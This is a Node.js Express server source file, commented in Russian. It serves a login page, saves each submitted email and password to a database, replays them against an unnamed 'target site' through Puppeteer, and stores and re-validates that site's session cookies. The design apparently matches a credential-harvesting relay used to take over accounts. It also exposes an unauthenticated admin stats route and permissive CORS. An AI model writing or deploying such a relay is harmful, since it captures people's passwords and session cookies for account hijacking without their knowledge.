require('dotenv').config();

const express = require('express');
const session = require('express-session');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const path = require('path');

const database = require('./database');
const puppeteerAuth = require('./puppeteer');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(helmet({
    contentSecurityPolicy: false, // Отключаем для разработки
}));

app.use(cors({
    origin: '*', // В продакшене замените на конкретный домен
    credentials: true
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Rate limiting - защита от брутфорса
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 минут
    max: 5, // максимум 5 запросов с одного IP
    message: { error: 'Слишком много попыток входа, попробуйте позже' }
});

// Статические файлы
app.use(express.static(path.join(__dirname, 'public')));

// Сессии для веб-интерфейса
app.use(session({
    secret: process.env.SESSION_SECRET || 'secret-key',
    resave: false,
    saveUninitialized: false,
    cookie: {
        secure: process.env.NODE_ENV === 'production',
        maxAge: 24 * 60 * 60 * 1000 // 24 часа
    }
}));

// Инициализация БД
database.init().catch(console.error);

// Роуты

// Главная страница (ваш HTML)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Эндпоинт для входа
app.post('/api/login', limiter, async (req, res) => {
    const { email, password } = req.body;
    const clientIp = req.ip || req.connection.remoteAddress;

    // Валидация
    if (!email || !password) {
        return res.status(400).json({ 
            success: false, 
            error: 'Email и пароль обязательны' 
        });
    }

    try {
        // 1. Сохраняем логин и пароль в БД
        const user = await database.saveUser(email, password);
        console.log(`User saved/updated: ${email}`);

        // 2. Пытаемся авторизоваться через Puppeteer
        const loginResult = await puppeteerAuth.login(email, password);

        // 3. Логируем попытку
        await database.logLoginAttempt(
            email, 
            clientIp, 
            loginResult.success,
            loginResult.error
        );

        if (loginResult.success) {
            // 4. Сохраняем куки от целевого сайта
            await database.saveUserCookies(email, loginResult.cookies);

            // 5. Получаем ID пользователя
            const userRecord = await database.getUserByEmail(email);
            
            if (userRecord) {
                // 6. Сохраняем сессию
                await database.saveSession(userRecord.id, loginResult.cookies);
            }

            // 7. Сохраняем в сессию Express
            req.session.isAuthenticated = true;
            req.session.userEmail = email;
            req.session.authCookies = loginResult.cookies;

            // 8. Отправляем успешный ответ
            res.json({
                success: true,
                message: 'Авторизация успешна',
                redirectUrl: loginResult.currentUrl,
                sessionValid: true
            });
        } else {
            // Неуспешная авторизация
            res.status(401).json({
                success: false,
                error: loginResult.error || 'Ошибка авторизации на целевом сайте'
            });
        }

    } catch (error) {
        console.error('Login error:', error);
        
        // Логируем ошибку
        await database.logLoginAttempt(email, clientIp, false, error.message);
        
        res.status(500).json({
            success: false,
            error: 'Внутренняя ошибка сервера'
        });
    }
});

// Эндпоинт для проверки статуса сессии
app.get('/api/session-status', async (req, res) => {
    if (!req.session.isAuthenticated || !req.session.userEmail) {
        return res.json({ authenticated: false });
    }

    try {
        const user = await database.getUserByEmail(req.session.userEmail);
        
        if (!user) {
            return res.json({ authenticated: false });
        }

        // Проверяем, есть ли активная сессия
        const activeSession = await database.getUserActiveSession(user.id);
        
        if (activeSession && activeSession.session_cookies) {
            // Проверяем, работают ли еще куки
            const cookies = JSON.parse(activeSession.session_cookies);
            const sessionCheck = await puppeteerAuth.checkSessionWithCookies(cookies);
            
            res.json({
                authenticated: true,
                sessionValid: sessionCheck.isValid,
                email: req.session.userEmail
            });
        } else {
            res.json({
                authenticated: true,
                sessionValid: false,
                email: req.session.userEmail
            });
        }
    } catch (error) {
        res.json({ authenticated: false, error: error.message });
    }
});

// Эндпоинт для выхода
app.post('/api/logout', (req, res) => {
    req.session.destroy((err) => {
        if (err) {
            return res.status(500).json({ error: 'Ошибка при выходе' });
        }
        res.json({ success: true });
    });
});

// Админский эндпоинт для статистики (защитите паролем в продакшене!)
app.get('/api/admin/stats', async (req, res) => {
    try {
        const stats = await database.getStats();
        res.json(stats);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Очистка старых сессий раз в час
setInterval(async () => {
    try {
        await database.cleanExpiredSessions();
        console.log('Expired sessions cleaned');
    } catch (error) {
        console.error('Error cleaning sessions:', error);
    }
}, 60 * 60 * 1000);

// Запуск сервера
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://0.0.0.0:${PORT}`);
    console.log(`Static files served from ${path.join(__dirname, 'public')}`);
    console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
});
